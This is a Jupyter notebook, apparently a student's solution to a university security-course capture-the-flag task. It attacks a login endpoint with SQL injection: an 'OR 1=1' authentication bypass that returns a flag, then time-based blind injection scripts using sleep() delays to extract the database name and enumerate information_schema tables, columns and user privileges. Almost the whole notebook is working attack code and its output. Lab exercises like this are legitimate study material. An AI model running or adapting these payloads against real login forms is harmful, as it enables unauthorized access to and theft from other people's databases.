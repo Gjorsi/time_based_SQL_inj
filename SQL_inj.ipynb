{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import time\n",
    "from string import ascii_lowercase, ascii_uppercase"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "#url = \"http://shepherd.ii.uib.no:8001/signIn\"\n",
    "url = \"http://shepherd.ii.uib.no:8002/signIn\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\"gg\": \"GG! Flag: inf226{s0_y0u_c4n_b4s1c_5q71}!\"}\n"
     ]
    }
   ],
   "source": [
    "data = {'inputName':\"admin' OR 1=1#\", 'inputPassword':\"anything\"}\n",
    "result = requests.post(url, data)\n",
    "print(result.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "check length: 0 -> delay: 0.048868656158447266 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 1 -> delay: 0.0468745231628418 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 2 -> delay: 0.04587745666503906 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 3 -> delay: 0.046875 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 4 -> delay: 0.043882131576538086 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 5 -> delay: 0.0468747615814209 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 6 -> delay: 0.047872066497802734 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 7 -> delay: 0.04487967491149902 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 8 -> delay: 0.04886937141418457 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 9 -> delay: 0.04587817192077637 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 10 -> delay: 0.04687356948852539 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 11 -> delay: 0.0468747615814209 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 12 -> delay: 0.05385613441467285 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 13 -> delay: 1.0491938591003418 reply: {\"info\": \"no feedback for you this time!\"}\n",
      "check length: 14 -> delay: 0.0498661994934082 reply: {\"info\": \"no feedback for you this time!\"}\n"
     ]
    }
   ],
   "source": [
    "for i in range(15):\n",
    "    data = {'inputName':\"a' OR (SELECT sleep(1) FROM dual WHERE length(database())=\" + str(i) + \") #\", \n",
    "            'inputPassword':\"password\"}\n",
    "    start = time.time()\n",
    "    result = requests.post(url, data)\n",
    "    end = time.time()\n",
    "    delay = end - start\n",
    "    print(\"check length: \" + str(i) + \" -> delay: \" + str(delay) + \" reply: \" + result.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 198,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "timebasedsqli\n"
     ]
    }
   ],
   "source": [
    "db_name = \"\"\n",
    "for i in range(13):\n",
    "    for c in ascii_lowercase:\n",
    "        data = {'inputName':\"a' OR (SELECT sleep(0.2) FROM dual WHERE database() LIKE '\" \n",
    "                + \"_\"*i + c + \"_\"*(12-i) + \"') #\",\n",
    "                'inputPassword':\"password\"}\n",
    "        start = time.time()\n",
    "        result = requests.post(url, data)\n",
    "        end = time.time()\n",
    "        delay = end - start\n",
    "        if delay > 0.2: db_name = db_name + c\n",
    "        \n",
    "print(db_name)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Table names\n",
    "There are several tables, find their names"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {},
   "outputs": [],
   "source": [
    "# guess table name made up of given prefix + any character a-z + %\n",
    "# return the set of characters for which these are true (true if the delay is more than the sleep value)\n",
    "def guess_next(prefix):\n",
    "    s = \"\"\n",
    "    for c in ascii_lowercase:\n",
    "        data = {'inputName':\"a' OR (SELECT sleep(0.2) FROM information_schema.tables WHERE \" + \n",
    "                \"table_name LIKE '\" + prefix + c + \"%') #\",\n",
    "                'inputPassword':\"p\"}\n",
    "        start = time.time()\n",
    "        result = requests.post(url, data)\n",
    "        end = time.time()\n",
    "        delay = end - start\n",
    "        if delay > 0.2: s = s + c\n",
    "    return s"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 147,
   "metadata": {},
   "outputs": [],
   "source": [
    "# build a list of strings based on guessing the next characters\n",
    "# when more than one guess is true for the next character, \n",
    "# create a string for each true guess and continue on the original, \n",
    "# appending the new to the end of list for later\n",
    "def find_tables(starting_char):\n",
    "    names = []\n",
    "    names.append(starting_char)\n",
    "    \n",
    "    for i in range(len(names)):\n",
    "        while True:\n",
    "            res = guess_next(names[i])\n",
    "            if len(res) == 0: \n",
    "                res = guess_next(names[i] + \"_\")\n",
    "                if len(res) == 0: break\n",
    "                else: names[i] = names[i] + \"_\"\n",
    "            if len(res) == 1:\n",
    "                names[i] = names[i] + res\n",
    "            if len(res) > 1:\n",
    "                names[i] = names[i] + res[0]\n",
    "                for j in range(1, len(res)):\n",
    "                    names.append(names[i] + res[j])\n",
    "                    \n",
    "    return names"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 142,
   "metadata": {},
   "outputs": [],
   "source": [
    "# get the first letters of all table names\n",
    "table_names = []\n",
    "first_characters = guess_next(\"\")\n",
    "first_characters = list(first_characters)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 143,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['c', 'e', 'f', 'g', 'i', 'k', 'o', 'p', 'r', 's', 't', 'u', 'v']\n"
     ]
    }
   ],
   "source": [
    "print(first_characters)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 175,
   "metadata": {},
   "outputs": [],
   "source": [
    "# due to network limitations (timeout / too many requests), we cant run all at the same time, \n",
    "# so run the function for each starting letter separately\n",
    "table_names.extend(find_tables(first_characters[12]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 176,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['character_sets', 'cho', 'engines', 'env', 'files', 'global_status', 'global_sv', 'innodb_buffer_page_lru', 'innodb_bc', 'innodb_bf', 'innodb_bl', 'innodb_bm', 'innodb_bs', 'innodb_bt', 'innodb_buffer_pao', 'key_column_usage', 'optimizer_trace', 'parameters', 'pal', 'par', 'parat', 'referential_constraints', 'reo', 'schemata', 'sce', 'sct', 'tablespaces', 'tab', 'tar', 'user_privileges', 'views']\n"
     ]
    }
   ],
   "source": [
    "print(table_names)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Column names"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {},
   "outputs": [],
   "source": [
    "def guess_next_col(prefix, tablename):\n",
    "    s = \"\"\n",
    "    for c in ascii_lowercase:\n",
    "        data = {'inputName':\"a' OR (SELECT sleep(0.3) FROM information_schema.columns WHERE \" + \n",
    "                \"column_name LIKE '\" + prefix + c + \"%' AND table_name='\" + tablename + \"') #\",\n",
    "                'inputPassword':\"p\"}\n",
    "        start = time.time()\n",
    "        result = requests.post(url, data)\n",
    "        end = time.time()\n",
    "        delay = end - start\n",
    "        if delay > 0.3: s = s + c\n",
    "    return s"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_col_names(table_name):\n",
    "    col_names = []\n",
    "    first_characters = guess_next_col(\"\", table_name)\n",
    "    for c in first_characters:\n",
    "        col_names.append(\"\" + c)\n",
    "\n",
    "    for i in range(len(col_names)):\n",
    "        while True:\n",
    "            res = guess_next_col(col_names[i], table_name)\n",
    "            if len(res) == 0: \n",
    "                res = guess_next_col(col_names[i] + \"_\", table_name)\n",
    "                if len(res) == 0: break\n",
    "                else: col_names[i] = col_names[i] + \"_\"\n",
    "            if len(res) == 1:\n",
    "                col_names[i] = col_names[i] + res\n",
    "            if len(res) > 1:\n",
    "                col_names[i] = col_names[i] + res[0]\n",
    "                for j in range(1, len(res)):\n",
    "                    col_names.append(col_names[i] + res[j])\n",
    "\n",
    "    return col_names"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 126,
   "metadata": {},
   "outputs": [],
   "source": [
    "user_p_columns = get_col_names(\"user_privileges\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 160,
   "metadata": {},
   "outputs": [],
   "source": [
    "key_c_columns = get_col_names(\"key_column_usage\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 161,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['grantee', 'is_grantable', 'privilege_type', 'table_catalog']\n",
      "['column_name', 'ordinal_position', 'position_in_unique_constraint', 'referenced_column_name', 'table_catalog', 'coln', 'referenced_ct', 'table_cn', 'table_cs']\n"
     ]
    }
   ],
   "source": [
    "print(user_p_columns)\n",
    "print(key_c_columns)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 227,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['character_maximum_length', 'data_type', 'numeric_precision', 'ordinal_position', 'parameter_mode', 'routine_type', 'specific_catalog', 'cho', 'character_mo', 'character_ms', 'dat', 'datae', 'numeric_ps', 'parameter_mn', 'specific_cn', 'specific_cs']\n"
     ]
    }
   ],
   "source": [
    "columns = get_col_names(\"parameters\")\n",
    "print(columns)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Search in column"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 248,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[500] | a: 0.07081031799316406\n",
      "[500] | b: 0.0688161849975586\n",
      "[500] | c: 0.06582355499267578\n",
      "[500] | d: 0.0688161849975586\n",
      "[500] | e: 0.06582403182983398\n",
      "[500] | f: 0.06582403182983398\n",
      "[500] | g: 0.06881570816040039\n",
      "[500] | h: 0.06682133674621582\n",
      "[500] | i: 0.06682133674621582\n",
      "[500] | j: 0.071807861328125\n",
      "[500] | k: 0.06781864166259766\n",
      "[500] | l: 0.06682133674621582\n",
      "[500] | m: 0.06682133674621582\n",
      "[500] | n: 0.06682109832763672\n",
      "[500] | o: 0.06682157516479492\n",
      "[500] | p: 0.07579731941223145\n",
      "[500] | q: 0.06781840324401855\n",
      "[500] | r: 0.06781840324401855\n",
      "[500] | s: 0.06781911849975586\n",
      "[500] | t: 0.06582331657409668\n",
      "[500] | u: 0.0688161849975586\n",
      "[500] | v: 0.06682109832763672\n",
      "[500] | w: 0.0688161849975586\n",
      "[500] | x: 0.07081055641174316\n",
      "[500] | y: 0.06781959533691406\n",
      "[500] | z: 0.06781768798828125\n"
     ]
    }
   ],
   "source": [
    "for c in ascii_lowercase:\n",
    "    data = {'inputName':\"a' OR (SELECT sleep(0.5) FROM user_privileges WHERE \" + \n",
    "                \"grantee LIKE '\" + c + \"%') #\",\n",
    "            'inputPassword':\"p\"}\n",
    "    start = time.time()\n",
    "    result = requests.post(url, data)\n",
    "    end = time.time()\n",
    "    delay = end - start\n",
    "\n",
    "    print(str(result)[10:15] + \" | \" + c + \": \" + str(delay))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 247,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n",
      "<title>500 Internal Server Error</title>\n",
      "<h1>Internal Server Error</h1>\n",
      "<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n",
      "\n",
      "0.07278561592102051\n"
     ]
    }
   ],
   "source": [
    "data = {'inputName':\"a' OR IF(((SELECT COUNT(*) FROM key_column_usage) = 0), sleep(1), 0) # \",\n",
    "        'inputPassword':\"p\"}\n",
    "start = time.time()\n",
    "result = requests.post(url, data)\n",
    "end = time.time()\n",
    "delay = end - start\n",
    "\n",
    "print(str(result.text))\n",
    "print(delay)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
